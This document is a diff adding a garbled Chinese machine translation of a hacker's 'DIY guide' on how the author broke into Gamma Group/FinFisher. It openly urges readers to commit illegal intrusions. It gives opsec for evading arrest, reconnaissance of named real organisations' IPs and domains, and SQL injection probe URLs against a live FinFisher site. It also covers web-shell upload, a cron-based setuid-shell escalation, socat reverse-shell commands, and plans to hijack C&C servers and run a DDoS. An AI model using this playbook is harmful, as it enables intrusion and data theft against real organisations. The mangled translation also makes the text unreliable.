@@ -1,0 +1,407 @@
+﻿                _ _ _ ____ _ _
+               | | | | __ _ ___ | | __ __）__ _ ___ | | _ | |
+               | | _ | | / _` | / __ | | / / | _ \ / _` | / __ | | / / |
+               | _ | （_ | |（__ | <| | _）|（_ | |（__ | <| _ |
+               | _ | | _ | \ __，_ | \ ___ | _ | \ _ \ | ____ / \ __，_ | \ ___ | _ | \ _（_）
+                                                 
+     一个DIY指南，为那些没有耐心等待告密者
+
+
+ -  [1]  - 简介
+
+我不是写这个吹嘘什么是31337 h4x0r我和什么m4d sk1llz
+它花了0wn Gamma。我写这个来揭示黑客，展示如何简单
+它是，并希望通知和激励你出去和砍狗屎。如果你
+没有编程或黑客的经验，下面的一些文本可能
+看起来像外语。检查最后的资源部分以帮助您
+开始。并相信我，一旦你学到了基础知识，你会意识到这一点
+真的比提交FOIA请求更容易。
+
+
+ -  [2]  - 保持安全
+
+这是非法的，因此您需要采取相同的基本预防措施：
+
+1）使用Truecrypt 7.1a [0]
+2）在加密卷内安装Whonix [1]
+3）（可选）虽然只有一切都超过Tor感谢Whonix是
+   可能足够了，最好不要使用互联网连接
+   您的姓名或地址。 cantenna，aircrack和reaver可以派上用场
+   这里。
+
+[0][https://truecrypt.ch/downloads/](https://truecrypt.ch/downloads/)
+[1][https://www.whonix.org/wiki/Download#Install_Whonix](https://truecrypt.ch/downloads/)
+
+只要你遵循常识，从不做任何黑客相关的
+在Whonix之外，永远不要做任何你正常的计算机使用内部Whonix，
+从来没有提到任何有关你的现实生活中的信息
+黑客，永远不会吹嘘你的非法黑客攻击给朋友的真实
+生活，那么你几乎可以做任何你想要的，没有恐惧v＆。
+
+注意：我不推荐实际上直接攻击Tor。而Tor可用
+对于某些事情，如web浏览，当涉及到使用黑客工具
+nmap，sqlmap和nikto，它们会产生数千个请求，它们将运行
+非常缓慢地超过Tor。更不用说，你需要一个公共IP地址
+接收连接背壳。我建议使用您已经入侵的服务器或VPS
+支付比特币从黑客。这样只有低带宽的文本界面
+之间你和服务器是超过Tor。您正在运行的所有命令将
+有一个很好的快速连接到你的目标。
+
+
+ -  [3]  - 映射目标
+
+基本上我只是反复使用fierce [0]，whois查找IP地址和
+域名和反向whois查找以查找所有IP地址空间和域
+与组织关联的名称。
+
+[0][http://ha.ckers.org/fierce/](http://ha.ckers.org/fierce/)
+
+举个例子，让我们去黑水。我们开始知道他们的主页在
+academi.com。运行fierce.pl -dns academi.com我们找到子域：
+67.238.84.228 email.academi.com
+67.238.84.242 extranet.academi.com
+67.238.84.240 mail.academi.com
+67.238.84.230 secure.academi.com
+67.238.84.227 vault.academi.com
+54.243.51.249 www.academi.com
+
+现在我们做whois查找，并找到www.academi.com的主页
+Amazon Web Service，而其他IP在以下范围内：
+NetRange：67.238.84.224  -  67.238.84.255
+CIDR：67.238.84.224/27
+CustName：黑水美国
+地址：850 Puddin Ridge Rd
+
+做一个whois查找在academi.com显示它也注册到相同
+地址，因此我们将使用它作为字符串来搜索反向whois
+查找。据我所知，所有实际的反向whois查询服务的成本
+钱，所以我只是欺骗与谷歌：
+“850 Puddin Ridge Rd”inurl：ip-address-lookup
+“850 Puddin Ridge Rd”inurl：domaintools
+
+现在在您找到的IP范围上运行fierce.pl -range查找dns名称，和
+fierce.pl -dns对域名查找子域和IP地址。多做
+whois查找并重复此过程，直到找到一切。
+
+也只是google的组织和浏览其网站。例如on
+academi.com我们找到到职业门户，在线商店和员工的链接
+资源页面，所以现在我们有更多：
+54.236.143.203 careers.academi.com
+67.132.195.12 academiproshop.com
+67.238.84.236 te.academi.com
+67.238.84.238 property.academi.com
+67.238.84.241 teams.academi.com
+
+如果你重复whois查找，这样你会发现academiproshop.com似乎
+不是由黑水托管或维护，所以划伤的名单
+有趣的IP /域。
+
+在FinFisher的情况下，我导致了脆弱的finsupport.finfisher.com
+只是一个whois查找finfisher.com，发现它注册到名称
+“FinFisher GmbH”。 Google搜寻：
+“FinFisher GmbH”inurl：domaintools
+找到gamma-international.de，它重定向到finsupport.finfisher.com
+
+...所以现在你有一些想法如何映射目标。
+这实际上是最重要的部分之一，因为攻击越大
+你能够映射出的表面，更容易找到一个洞
+在某处。
+
+
+ -  [4]  - 扫描和利用
+
+扫描您通过nmap找到的所有IP范围，以查找所有正在运行的服务。在旁边
+从标准端口扫描，对于SNMP的扫描被低估。
+
+现在对于每个服务，你发现运行：
+
+1）它暴露的东西，它不应该？有时候公司会有服务
+运行，不需要验证，只是假定它的安全，因为url
+或IP访问它不是公共的。也许fierce发现一个git子域，你可以
+请转到git.companyname.come / gitweb /并浏览其源代码。
+
+2）是否可能是错误配置？也许他们有一个ftp服务器允许
+对重要目录的匿名读或写访问。也许他们有
+数据库服务器使用空白管理员密码（lol stratfor）。也许他们嵌入
+设备（VOIP盒，IP摄像机，路由器等）正在使用制造商的
+默认密码。
+
+3）它运行的旧版本的软件是否容易受到公共利用？
+
+
+网络服务器应该有自己的类别。任何网络服务器，包括nmap
+会经常发现在非标准端口上运行，我通常：
+
+1）浏览他们。特别是在子域，fierce的发现是不打算
+对于公共查看像test.company.com或dev.company.com你会经常找到
+有趣的东西只是通过看看他们。
+
+2）运行nikto [0]。这将检查像webserver / .svn /，
+webserver / backup /，webserver / phpinfo.php，还有几千个常用的
+错误和配置错误。
+
+3）识别网站上使用的软件。 WhatWeb是有用的[1]
+
+4）根据网站运行的软件，使用更具体的工具
+像wpscan [2]，CMS-Explorer [3]和Joomscan [4]。
+
+首先尝试反对所有服务，看看是否有错误配置，
+公共已知的漏洞或其他简单的方法。如果不是，是时候移动
+寻找新的漏洞：
+
+5）自定义编码的web应用程序比大的广泛使用更多的沃土的bug
+项目，所以尝试这些第一。我使用ZAP [5]，和它的一些组合
+自动化测试以及手动戳记的帮助
+拦截代理。
+
+6）对于他们正在运行的非自定义软件，获取一份副本。如果是的话
+免费软件，你可以下载它。如果是专有的，你通常可以
+盗版它。如果它是专有和晦涩，你不能盗版它你
+可以买它（跛脚）或找到其他网站运行相同的软件使用谷歌，
+找到一个更容易黑客，并从他们得到一个副本。
+
+[0] http://www.cirt.net/nikto2
+[1] http://www.morningstarsecurity.com/research/whatweb
+[2] http://wpscan.org/
+[3] https://code.google.com/p/cms-explorer/
+[4] http://sourceforge.net/projects/joomscan/
+[5] https://code.google.com/p/zaproxy/
+
+
+对于finsupport.finfisher.com的过程是：
+
+* 启动nikto在后台运行。
+
+* 访问网站。只看一个登录页面。快速检查sqli在
+  登录表单。
+
+* 看看WhatWeb是否知道网站正在运行什么软件。
+
+* WhatWeb不认识它，所以下一个问题，我想回答是如果这
+  是Gamma的自定义网站，或者如果有其他网站使用相同的
+  软件。
+
+* 我查看页面源代码找到一个我可以搜索的网址（index.php不是
+  完全独特于此软件）。我选择Scripts / scripts.js.php和google：
+  allinurl：“Scripts / scripts.js.php”
+
+* 我发现有一些其他网站使用相同的软件，所有编码
+  相同的小网站设计公司。看起来每个网站都是自定义编码，但是
+  他们分享了很多代码。所以我砍了几个他们得到一个集合
+  由网页设计公司编写的代码。
+
+在这一点上，我可以看到记者将写给鼓的新闻故事
+up“视图：”在复杂的多步攻击中，黑客首先攻击了
+网页设计公司，以便获取有助于他们的机密数据
+攻击Gamma集团...“
+
+但它真的很容易，几乎在自动驾驶仪，一旦你得到的悬挂
+它。它花了所有的几分钟：
+
+* google allinurl：“Scripts / scripts.js.php”并找到其他网站
+
+*注意他们都是sql注入在第一个url参数我试试。
+
+*意识到他们正在运行Apache ModSecurity，所以我需要使用sqlmap [0]
+  选项--tamper ='tamper / modsecurityversioned.py'
+
+*获取管理员登录信息，登录并上传php shell [1]（
+  检查允许的文件扩展名是在javascript中完成的客户端）和
+  下载网站的源代码。
+
+[0] http://sqlmap.org/
+[1] https://epinna.github.io/Weevely/
+
+查看源代码，他们可能会命名为Damn Vulnerable
+Web App v2 [0]。它有sqli，LFI，文件上传检查完成客户端
+javascript，如果您未经验证，管理页面只会将您发送回
+具有Location标头的登录页面，但您可以拥有您的拦截代理
+过滤Location头，并访问它只是罚款。
+
+[0] http://www.dvwa.co.uk/
+
+回到finupport站点，admin / BackOffice /页面返回
+403禁止，我有一些问题，LFI，所以我切换到使用
+sqli（很高兴有十几个选项可供选择）。其他网站由
+web设计器都有一个可注入的print.php，所以一些快速请求：
+https://finsupport.finfisher.com/GGI/Home/print.php?id=1和1 = 1
+https://finsupport.finfisher.com/GGI/Home/print.php?id=1和2 = 1
+显示finsupport也有print.php，它是可注射的。它是
+数据库管理员！对于MySQL，这意味着您可以读取和写入文件。原来
+该网站已启用magicquotes，所以我不能使用INTO OUTFILE来写文件。
+但我可以使用一个简短的脚本，使用sqlmap --file-read来获取php源
+对于URL，以及正常的Web请求获取HTML，然后查找文件
+包括或需要在php源中，并找到在HTML中链接的php文件，
+以递归方式将源下载到整个站点。
+
+通过源代码，我看到客户可以附加一个文件给他们的支持
+票，并且没有检查文件扩展名。所以我选择一个用户名和
+密码出客户数据库，使用php shell创建支持请求
+附加，我在！
+
+
+ -  [5]  - （失败）升级
+
+ ___________
+<got r00t？ >
+ -----------
+        \ ^ __ ^
+         \（oo）\ _______
+            （__）\）\ / \
+                || ---- w |
+                || ||
+            ^^^^^^^^^^^^^^^^
+
+超过50％的linux服务器你在野外遇到两个简单的脚本，
+Linux_Exploit_Suggester [0]和unix-privesc-check [1]。
+
+[0] https://github.com/PenturaLabs/Linux_Exploit_Suggester
+[1] https://code.google.com/p/unix-privesc-check/
+
+finsupport运行的是最新版本的Debian，没有本地root漏洞，
+但是unix-privesc-check返回：
+警告：/etc/cron.hourly/mgmtlicensestatus由cron作为root运行。用户
+www-data可以写入/etc/cron.hourly/mgmtlicensestatus
+警告：/etc/cron.hourly/webalizer由cron作为root运行。用户www-data
+可以写入/etc/cron.hourly/webalizer
+
+所以我添加到/etc/cron.hourly/webalizer：
+chown root：root / path / to / my_setuid_shell
+chmod 04755 / path / to / my_setuid_shell
+
+等一个小时，没有什么。结果是，当cron进程正在运行
+它似乎并没有真正运行cron作业。在webalizer中查找
+目录显示它没有更新前一个月的统计数据。显然之后
+更新时区cron有时会运行在错误的时间或有时不运行
+运行，您需要在更改时区后重新启动cron。 ls -l
+/ etc / localtime显示时区得到更新6月6日，同时webalizer
+停止录制统计信息，这可能是问题。无论如何，唯一的
+这个服务器做的东西是主机的网站，所以我已经有权访问
+一切有趣的它。根不会得到任何新的东西，所以我动议
+到其余的网络。
+
+
+ -  [6]  - 枢轴
+
+下一步是查看你所攻击的盒子的本地网络。这个
+几乎与第一个扫描和挖掘步骤相同，除了
+从防火墙的后面许多更有趣的服务将暴露。一个
+tarball包含一个静态链接的nmap及其所有脚本的副本
+可以上传和运行任何盒子对此非常有用。各种nfs- *和
+特别是smb- *脚本nmap会非常有用。
+
+唯一有趣的事情，我可以得到在finupport的本地网络是另一个
+网络服务器提供名为“qateam”的文件夹，其中包含其移动恶意软件。
+
+
+ -  [7]  - 有乐趣
+
+一旦你进入他们的网络，真正的乐趣开始。只是使用你的想象力。
+虽然我把这个指南给了wannabe告密者，但没有理由
+限制自己泄露文件。我原来的计划是：
+1）Hack Gamma并获取FinSpy服务器软件的副本
+2）查找FinSpy服务器中的漏洞。
+3）扫描互联网，并入侵，所有FinSpy C＆C服务器。
+4）确定运行它们的组。
+5）使用C＆C服务器在所有目标上上传并运行程序
+   谁在监视他们。
+6）使用C＆C服务器卸载所有目标上的FinFisher。
+7）将以前的C＆C服务器加入到DDoS Gamma Group的僵尸网络中。
+
+它只是在未能完全破解Gamma并最终与一些
+有趣的文档，但没有FinSpy服务器软件的副本，我不得不
+做出应有的远远不那么丰富的备份计划泄漏他们的东西，而
+在Twitter上嘲笑他们。
+将您的GPU指向FinSpy-PC + Mobile-2012-07-12-Final.zip并破解密码
+已经这样我可以移动到步骤2！
+
+
+ -  [8]  - 其他方法
+
+上面概述的扫描，发现漏洞和利用的一般方法
+是只是一种方式黑客，可能更适合那些有背景的人
+编程。没有一个正确的方法，任何工作方法是一样好
+任何其他。其他主要方式，我将陈述，而不详细的是：
+
+1）利用web浏览器，java，flash或微软office，结合使用
+通过电子邮件向员工发送令人信服的消息，让他们打开链接或
+附件，或黑客员工经常访问的网站，并添加
+browser / java / flash exploit。
+这是大多数政府黑客团体使用的方法，但你不是
+需要一个政府有数百万的花在0day研究或订阅
+到FinSploit或VUPEN将其关闭。你可以得到一个优质的俄罗斯exploit工具包
+几千，并租用访问一个少得多。还有
+metasploit浏览器autopwn，但你可能会更好的运气没有
+利用和假的闪存更新提示。
+
+2）利用人们是好的，信任的和有帮助的事实95％
+的时间。
+信息产业发明了一个术语，使这种声音像某种
+科学：“社会工程”。这可能是去的方式，如果你不知道
+太多关于计算机，它真的是所有需要成功
+黑客[0]。
+
+[0] https://www.youtube.com/watch?v=DB6ywr9fngU
+
+
+ -  [9]  - 资源
+
+链接：
+
+* https://www.pentesterlab.com/exercises/
+* http://overthewire.org/wargames/
+* http://www.hackthissite.org/
+* http://smashthestack.org/
+* http://www.win.tue.nl/~aeb/linux/hh/hh.html
+* http://www.phrack.com/
+* http://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot
+* http://www.offensive-security.com/metasploit-unleashed/PSExec_Pass_The_Hash
+* https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/
+* https://www.netspi.com/blog/entryid/140/resources-for-aspiring-penetration-terters
+  （所有他的其他博客文章是伟大的）
+* https://www.corelan.be/（从Exploit写作教程第1部分开始）
+* http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
+  其中一个技巧是，在大多数系统上apache访问日志是
+  只能由root读取，但您仍然可以从/ proc / self / fd / 10或
+  任何fd apache打开它。如果提到它也将更有用
+  什么版本的php各种技巧固定。
+* http://www.dest-unreach.org/socat/
+  获取可用的反向shell与静态链接的socat副本
+  您的目标和：
+  target $ socat exec：'bash -li'，pty，stderr，setsid，sigint，sane tcp-listen：PORTNUM
+  host $ socat文件：`tty`，raw，echo = 0 tcp-connect：localhost：PORTNUM
+  它也有用于设置奇怪的枢轴和各种其他的东西。
+
+图书：
+
+* Web应用程序黑客手册
+* 黑客：剥削的艺术
+* 数据库黑客手册
+* 软件安全评估的艺术
+* 一个Bug猎人的日记
+* 地下：电子前沿的黑客，疯狂和痴迷的故事
+* TCP / IP说明
+
+除了黑客特定的东西几乎任何有用的系统
+管理员设置和管理网络也将是有用的
+探索他们。这包括熟悉Windows命令提示符和unix
+shell，基本脚本技能，ldap，kerberos，活动目录，
+网络等。
+
+
+ -  [10]  -  Outro
+
+你会注意到一些这听起来完全像Gamma在做什么。黑客是一个
+工具。它不是销售黑客工具，使Gamma邪恶。这是谁的他们
+客户的目标和什么目的，使他们的邪恶。这不是
+说工具本质上是中性的。黑客是一个进攻工具。在里面
+同样的方式，游击战争使它更难占领一个国家，无论何时
+它的攻击比保卫它更难以维持非法的更便宜
+权威和不平等。所以我写这个试图使黑客更容易和更多
+无障碍。我想表明，Gamma集团真的没什么
+花式，只是标准sqli，你有能力出去带走
+类似的行动。
+
+团结对加沙每个人，以色列良心反对者，切尔西
+Manning，Jeremy Hammond，Peter Sunde，anakata和所有其他监禁
+黑客，异议人士和罪犯！
